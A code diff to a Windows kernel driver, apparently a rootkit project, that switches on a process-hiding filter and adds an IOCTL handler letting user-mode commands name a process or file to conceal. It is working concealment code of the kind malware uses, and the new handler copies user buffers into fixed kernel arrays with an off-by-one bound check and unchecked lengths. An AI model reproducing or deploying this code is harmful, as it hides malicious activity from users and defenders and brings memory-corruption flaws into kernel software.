@@ -50,7 +50,7 @@ NTSTATUS DriverEntry(PDRIVER_OBJECT driver_object, PUNICODE_STRING registry_path
         DebugMessage("Error creating symbolic link %wZ", DEVICE_SYMBOLIC_NAME);
     }
 
-    // status = filter::ProcessHider::Register();
+    status = filter::ProcessHider::Register();
 
     if (!NT_SUCCESS(status))
     {
@@ -81,7 +81,7 @@ NTSTATUS DriverUnload(PDRIVER_OBJECT driver_object)
     IoDeleteDevice(driver_object->DeviceObject);
     IoDeleteSymbolicLink(&DEVICE_SYMBOLIC_NAME);
 
-    // filter::ProcessHider::Unload();
+    filter::ProcessHider::Unload();
 
     return STATUS_SUCCESS;
 }
@@ -89,6 +89,9 @@ NTSTATUS DriverUnload(PDRIVER_OBJECT driver_object)
 NTSTATUS HandleCustomIOCTL(PDEVICE_OBJECT device_object, PIRP irp)
 {
     UNREFERENCED_PARAMETER(device_object);
+
+    WCHAR cmd[MAX_SIZE];
+    long long msg_sz;
     PIO_STACK_LOCATION stackLocation = NULL;
 
     stackLocation = IoGetCurrentIrpStackLocation(irp);
@@ -97,7 +100,34 @@ NTSTATUS HandleCustomIOCTL(PDEVICE_OBJECT device_object, PIRP irp)
     {
         // handle message here
         DebugMessage("Input received from userland: %s", (char*)irp->AssociatedIrp.SystemBuffer);
+        msg_sz = wcslen((WCHAR*)irp->AssociatedIrp.SystemBuffer);
+        if (msg_sz <= MAX_SIZE)
+        {
+            RtlCopyMemory(cmd, (WCHAR*)irp->AssociatedIrp.SystemBuffer, msg_sz * sizeof(WCHAR));
+            if (cmd[1] == L' ')
+            {
+                switch (cmd[0])
+                {
+                case L'p':
+                    KeAcquireGuardedMutex(&filter::ProcessHider::process_name_lock_);
+                    RtlCopyMemory(&filter::ProcessHider::process_to_hide_, (PWCHAR)((PUCHAR)irp->AssociatedIrp.SystemBuffer + 4), (msg_sz - 2) * sizeof(WCHAR));
+                    DebugMessage("Hide process %S", filter::ProcessHider::process_to_hide_);
+                    KeReleaseGuardedMutex(&filter::ProcessHider::process_name_lock_);
+                    break;
+                case L'f':
+                    KeAcquireGuardedMutex(&filter::FileFilter::file_name_lock_);
+                    RtlCopyMemory(&filter::FileFilter::file_to_hide_, (PWCHAR)((PUCHAR)irp->AssociatedIrp.SystemBuffer + 4), (msg_sz - 2) * sizeof(WCHAR));
+                    DebugMessage("Hide file %S", filter::FileFilter::file_to_hide_);
+                    KeReleaseGuardedMutex(&filter::FileFilter::file_name_lock_);
+                    break;
+                default:
+                    break;
+                }
+            }
+
+        }
     }
+
 
     IoCompleteRequest(irp, IO_NO_INCREMENT);
 
